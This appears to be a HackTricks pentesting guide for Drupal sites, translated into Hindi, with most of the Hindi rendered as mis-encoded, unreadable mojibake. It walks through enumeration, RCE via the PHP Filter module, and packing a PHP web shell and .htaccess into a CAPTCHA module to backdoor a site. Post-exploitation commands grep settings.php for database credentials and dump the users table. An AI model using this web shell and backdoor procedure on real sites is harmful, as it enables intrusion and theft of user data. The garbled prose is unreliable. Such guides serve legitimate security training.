# Drupal

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## рдЦреЛрдЬ

* **рдореЗрдЯрд╛** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
curl https://www.drupal.org/ | grep 'content="Drupal'
```
* **рдиреЛрдб**: рдбреНрд░реБрдкрд▓ **рдиреЛрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдкрдиреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдЗрдВрдбреЗрдХреНрд╕ рдХрд░рддрд╛ рд╣реИ**ред рдПрдХ рдиреЛрдб рдореЗрдВ рдХреБрдЫ рднреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдЬреИрд╕реЗ рдмреНрд▓реЙрдЧ рдкреЛрд╕реНрдЯ, рдкреЛрд▓, рд▓реЗрдЦ рдЖрджрд┐ред рдкреГрд╖реНрда URI рдЖрдорддреМрд░ рдкрд░ `/node/<nodeid>` рдХреЗ рд░реВрдк рдореЗрдВ рд╣реЛрддреЗ рд╣реИрдВред
```bash
curl drupal-site.com/node/1
```
## рдЬрд╛рдВрдЪ

Drupal рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рддреАрди рдкреНрд░рдХрд╛рд░ рдХреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИ:

1. **`рдкреНрд░рд╢рд╛рд╕рдХ`**: рдЗрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдкреВрд░реНрдг рдирд┐рдпрдВрддреНрд░рдг рд╣реЛрддрд╛ рд╣реИред
2. **`рдкреНрд░рдорд╛рдгрд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛`**: рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдиреЗ рдФрд░ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд▓реЗрдЦ рдЬреЛрдбрд╝рдиреЗ рдФрд░ рд╕рдВрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдЬреИрд╕реЗ рдХрд╛рд░реНрдп рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред
3. **`рдЕрдЬреНрдЮрд╛рдд`**: рд╕рднреА рд╡реЗрдмрд╕рд╛рдЗрдЯ рдЖрдЧрдВрддреБрдХреЛрдВ рдХреЛ рдЕрдЬреНрдЮрд╛рдд рдХреЗ рд░реВрдк рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдЗрди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдж рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

### рд╕рдВрд╕реНрдХрд░рдг

* `/CHANGELOG.txt` рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ
```bash
curl -s http://drupal-site.local/CHANGELOG.txt | grep -m2 ""

Drupal 7.57, 2018-02-21
```
{% hint style="info" %}
рдирд╡реАрдирддрдо Drupal рд╕реНрдерд╛рдкрдирд╛рдПрдВ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `CHANGELOG.txt` рдФрд░ `README.txt` рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдкрд╣реБрдВрдЪ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рддреА рд╣реИрдВред
{% endhint %}

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЧрдгрдирд╛

#### рдкрдВрдЬреАрдХрд░рдг

_/user/register_ рдореЗрдВ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдмрдирд╛рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдпрджрд┐ рдирд╛рдо рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рддреЛ рдпрд╣ рд╕реВрдЪрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (254).png>)

#### рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (255).png>)

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдирдпрд╛ рдкрд╛рд╕рд╡рд░реНрдб рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ:

![](<../../.gitbook/assets/image (256).png>)

### рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ

_/user/\<number>_ рддрдХ рдкрд╣реБрдВрдЪ рдХрд░ рдЖрдк рдореМрдЬреВрджрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕рдВрдЦреНрдпрд╛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ _/users/3_ рдПрдХ рдЦреЛрдЬрд╛ рдирд╣реАрдВ рдорд┐рд▓рд╛ рддреНрд░реБрдЯрд┐ рджреЗрддрд╛ рд╣реИ:

![](<../../.gitbook/assets/image (257).png>)

![](<../../.gitbook/assets/image (227) (1) (1).png>)

### рдЫрд┐рдкреА рд╣реБрдИ рдкреГрд╖реНрда

**_/node/$_ рдЬрд╣рд╛рдВ _$_ рдПрдХ рд╕рдВрдЦреНрдпрд╛ рд╣реИ** (1 рд╕реЗ 500 рддрдХ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред\
рдЖрдк **рдЫрд┐рдкреА рд╣реБрдИ рдкреГрд╖реНрда** (рдкрд░реАрдХреНрд╖рдг, рд╡рд┐рдХрд╛рд╕) рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдЦреЛрдЬ рдЗрдВрдЬрди рджреНрд╡рд╛рд░рд╛ рд╕рдВрджрд░реНрднрд┐рдд рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВред

#### рд╕реНрдерд╛рдкрд┐рдд рдореЙрдбреНрдпреВрд▓ рдЬрд╛рдирдХрд╛рд░реА
```bash
#From https://twitter.com/intigriti/status/1439192489093644292/photo/1
#Get info on installed modules
curl https://example.com/config/sync/core.extension.yml
curl https://example.com/core/core.services.yml

# Download content from files exposed in the previous step
curl https://example.com/config/sync/swiftmailer.transport.yml
```
### рд╕реНрд╡рдЪрд╛рд▓рд┐рдд

Automatic testing tools can be very useful when it comes to pentesting Drupal websites. These tools can help identify common vulnerabilities and weaknesses in the Drupal installation. Here are some popular automatic testing tools for Drupal:

- **Drupalgeddon**: This tool is specifically designed to exploit the Drupalgeddon vulnerability, which is a highly critical vulnerability that allows remote code execution. It can be used to test if a Drupal website is vulnerable to this exploit.

- **Droopescan**: Droopescan is a scanner that can be used to identify vulnerabilities in Drupal installations. It can detect outdated modules, weak passwords, and other security issues.

- **CMSmap**: CMSmap is a versatile scanner that can be used to identify the CMS (Content Management System) used by a website. It can also detect vulnerabilities in Drupal installations.

- **Nikto**: Nikto is a popular web server scanner that can be used to identify vulnerabilities in Drupal installations. It can detect outdated versions, misconfigurations, and other security issues.

- **Wapiti**: Wapiti is a web application vulnerability scanner that can be used to identify vulnerabilities in Drupal installations. It can detect SQL injection, XSS (Cross-Site Scripting), and other common web application vulnerabilities.

These tools can save time and effort during the pentesting process by automating the identification of common vulnerabilities in Drupal websites. However, it's important to note that automatic testing tools may not detect all vulnerabilities, so manual testing is still necessary to ensure thorough security testing.
```bash
droopescan scan drupal -u http://drupal-site.local
```
## RCE

### PHP Filter Module рдХреЗ рд╕рд╛рде

{% hint style="warning" %}
рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдореЗрдВ Drupal **(version 8 рд╕реЗ рдкрд╣рд▓реЗ)** рдореЗрдВ, рдПрдбрдорд┐рди рдХреЗ рд░реВрдк рдореЗрдВ рд▓реЙрдЧ рдЗрди рдХрд░рдХреЗ **`PHP filter` рдореЙрдбреНрдпреВрд▓ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рд╕рдВрднрд╡ рдерд╛**, рдЬреЛ "рдПрдореНрдмреЗрдбреЗрдб PHP рдХреЛрдб/рд╕реНрдирд┐рдкреЗрдЯ рдХреЛ рдореВрд▓реНрдпрд╛рдВрдХрди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред"
{% endhint %}

рдЖрдкрдХреЛ **рдкреНрд▓рдЧрдЗрди php рдХреЛ рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ** (рдЗрд╕реЗ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП _/modules/php_ рддрдХ рдкрд╣реБрдВрдЪреЗрдВ рдФрд░ рдпрджрд┐ рдпрд╣ **403** рд▓реМрдЯрд╛рддрд╛ рд╣реИ рддреЛ, **рдореМрдЬреВрдж рд╣реИ**, рдпрджрд┐ **рдирд╣реАрдВ рдорд┐рд▓рд╛**, рддреЛ **рдкреНрд▓рдЧрдЗрди php рд╕реНрдерд╛рдкрд┐рдд рдирд╣реАрдВ рд╣реИ**)

_рдореЙрдбреНрдпреВрд▓реНрд╕_ рдкрд░ рдЬрд╛рдПрдВ -> (**рдЬрд╛рдВрдЪреЗрдВ**) _PHP Filter_ -> _рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рд╕рд╣реЗрдЬреЗрдВ_

![](<../../.gitbook/assets/image (247) (1).png>)

рдлрд┐рд░ _Add content_ рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ -> _Basic Page_ рдпрд╛ _Article_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ -> _рд╢рд░реАрд░ рдкрд░ php рд╢реИрд▓рдХреЛрдб рд▓рд┐рдЦреЗрдВ_ -> _Text format_ рдореЗрдВ _PHP code_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ -> _Preview_ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ

![](<../../.gitbook/assets/image (253) (1).png>)

рдЕрдВрдд рдореЗрдВ, рдирд╡реАрдирддрдо рдмрдирд╛рдП рдЧрдП рдиреЛрдб рддрдХ рдкрд╣реБрдВрдЪреЗрдВ:
```bash
curl http://drupal-site.local/node/3
```
### PHP Filter Module рдХреЛ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВ

**8 рд╕рдВрд╕реНрдХрд░рдг рдХреЗ рдмрд╛рдж рд╕реЗ**, [**PHP Filter**](https://www.drupal.org/project/php/releases/8.x-1.1) **рдореЙрдбреНрдпреВрд▓ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЗрдВрд╕реНрдЯреЙрд▓ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ**ред рдЗрд╕ рдлрдВрдХреНрд╢рдирд╛рд▓рд┐рдЯреА рдХрд╛ рд▓рд╛рдн рдЙрдард╛рдиреЗ рдХреЗ рд▓рд┐рдП, рд╣рдореЗрдВ **рдореЙрдбреНрдпреВрд▓ рдХреЛ рдЦреБрдж рд╣реА рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛**ред

1. Drupal рд╡реЗрдмрд╕рд╛рдЗрдЯ рд╕реЗ рдореЙрдбреНрдпреВрд▓ рдХреЗ рд╕рдмрд╕реЗ рд╣рд╛рд▓ рдХреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВред
1. wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
2. рдбрд╛рдЙрдирд▓реЛрдб рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, **`рдкреНрд░рд╢рд╛рд╕рди`** > **`рд░рд┐рдкреЛрд░реНрдЯ`** > **`рдЙрдкрд▓рдмреНрдз рдЕрдкрдбреЗрдЯ`** рдкрд░ рдЬрд╛рдПрдВред
3. **`рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ **`рдЗрдВрд╕реНрдЯреЙрд▓`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
4. рдореЙрдбреНрдпреВрд▓ рдЗрдВрд╕реНрдЯреЙрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рд╣рдо **`рд╕рд╛рдордЧреНрд░реА`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ рдПрдХ рдирдпрд╛ рдмреЗрд╕рд┐рдХ рдкреЗрдЬ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕рд╛ рдХрд┐ рд╣рдордиреЗ Drupal 7 рдХреЗ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдХрд┐рдпрд╛ рдерд╛ред рдлрд┐рд░ рд╕реБрдирд┐рд╢реНрдЪрд┐рдд рдХрд░реЗрдВ рдХрд┐ **`рдкрд╛рда рд╕реНрд╡рд░реВрдк` рдбреНрд░реЙрдкрдбрд╛рдЙрди рд╕реЗ `PHP рдХреЛрдб` рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ**ред

### Backdoored рдореЙрдбреНрдпреВрд▓

рдПрдХ backdoored рдореЙрдбреНрдпреВрд▓ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП, **рдореМрдЬреВрджрд╛ рдореЙрдбреНрдпреВрд▓ рдореЗрдВ рдПрдХ рд╢реИрд▓ рдЬреЛрдбрд╝рдирд╛** рд╕рдВрднрд╡ рд╣реИред рдореЙрдбреНрдпреВрд▓ drupal.org рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ рдорд┐рд▓ рд╕рдХрддреЗ рд╣реИрдВред рд╣рдо рдПрдХ рдореЙрдбреНрдпреВрд▓ рдЬреИрд╕реЗ [CAPTCHA](https://www.drupal.org/project/captcha) рдХрд╛ рдЪрдпрди рдХрд░реЗрдВред рдиреАрдЪреЗ рд╕реНрдХреНрд░реЙрд▓ рдХрд░реЗрдВ рдФрд░ tar.gz [рдЖрд░реНрдХрд╛рдЗрд╡](https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz) рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рдХреЙрдкреА рдХрд░реЗрдВред

* рдЖрд░реНрдХрд╛рдЗрд╡ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ рдФрд░ рдЙрд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдирд┐рдХрд╛рд▓реЗрдВред
```
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```
* рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдПрдХ **PHP рд╡реЗрдм рд╢реИрд▓** рдмрдирд╛рдПрдБ:
```php
<?php
system($_GET["cmd"]);
?>
```
* рдЕрдЧрд▓реЗ, рд╣рдореЗрдВ рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдБрдЪ рдХреЗ рд▓рд┐рдП рдЦреБрдж рдХреЛ рдПрдХ **`.htaccess`** рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреА рд╣реЛрдЧреАред рдпрд╣ рдЬрд░реВрд░реА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Drupal **`/modules`** рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рд╕реАрдзрд╛ рдкрд╣реБрдБрдЪ рдХреЛ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИред
```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```
* рдЙрдкрд░реЛрдХреНрдд рд╡рд┐рдиреНрдпрд╛рд╕ рдиреЗ рдирд┐рдпрдореЛрдВ рдХреЛ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рд╣реИ рдЬрдм рд╣рдо /modules рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЕрдиреБрд░реЛрдз рдХрд░рддреЗ рд╣реИрдВ рддреЛ / рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдПред рдЗрди рджреЛрдиреЛрдВ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ captcha рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреЙрдкреА рдХрд░реЗрдВ рдФрд░ рдПрдХ рдЖрд░реНрдХрд╛рдЗрд╡ рдмрдирд╛рдПрдВред
```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/
```
* рдпрджрд┐ рд╣рдореЗрдВ рд╡реЗрдмрд╕рд╛рдЗрдЯ рдкрд░ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рдкрд╣реБрдВрдЪ** рд╣реИ, рддреЛ **`Manage`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ рдФрд░ рд╕рд╛рдЗрдбрдмрд╛рд░ рдкрд░ **`Extend`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред рдЕрдЧрд▓реЗ рдХрджрдо рдореЗрдВ, **`+ Install new module`** рдмрдЯрди рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВ, рдФрд░ рд╣рдореЗрдВ рдЗрдВрд╕реНрдЯреЙрд▓ рдкреЗрдЬ рдкрд░ рд▓реЗ рдЬрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреИрд╕реЗ `http://drupal-site.local/admin/modules/install`ред рдмреИрдХрдбреЛрд░реНрдб рдХреИрдкреНрдЪрд╛ рдЖрд░реНрдХрд╛рдЗрд╡ рддрдХ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВ рдФрд░ **`Install`** рдкрд░ рдХреНрд▓рд┐рдХ рдХрд░реЗрдВред
* рдЗрдВрд╕реНрдЯреЙрд▓реЗрд╢рди рд╕рдлрд▓ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **`/modules/captcha/shell.php`** рдкрд░ рдмреНрд░рд╛рдЙрдЬрд╝ рдХрд░реЗрдВред

## рдкреЛрд╕реНрдЯ рдПрдХреНрд╕рдкреНрд▓реЛрдЗрдЯреЗрд╢рди

### settings.php рдкрдврд╝реЗрдВ
```
find / -name settings.php -exec grep "drupal_hash_salt\|'database'\|'username'\|'password'\|'host'\|'port'\|'driver'\|'prefix'" {} \; 2>/dev/null
```
### рдбреАрдмреА рд╕реЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдбрдВрдк рдХрд░реЗрдВ

To dump users from the database, you can use the following steps:

1. Identify the database management system (DBMS) being used by the Drupal website. This can be MySQL, PostgreSQL, or another DBMS.

2. Use the appropriate command-line tool or graphical interface to connect to the database.

3. Once connected, execute the SQL query to dump the users table. The query may vary depending on the DBMS being used. For example, in MySQL, you can use the following command:

   ```sql
   SELECT * FROM users;
   ```

   This will retrieve all the records from the users table.

4. Save the output of the query to a file for further analysis. You can redirect the output to a file using the following command in the command-line interface:

   ```bash
   mysql -u <username> -p <database> -e "SELECT * FROM users;" > users_dump.txt
   ```

   Replace `<username>` with the database username, `<database>` with the name of the Drupal database, and `users_dump.txt` with the desired filename.

By following these steps, you will be able to dump the users from the Drupal database.
```
mysql -u drupaluser --password='2r9u8hu23t532erew' -e 'use drupal; select * from users'
```
## рд╕рдВрджрд░реНрдн

* [https://academy.hackthebox.com/module/113/section/1209](https://academy.hackthebox.com/module/113/section/1209)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЗрдЪреНрдЫрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣!
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ рд╣рдореЗрдВ PR рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЗ рд▓рд┐рдП рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>
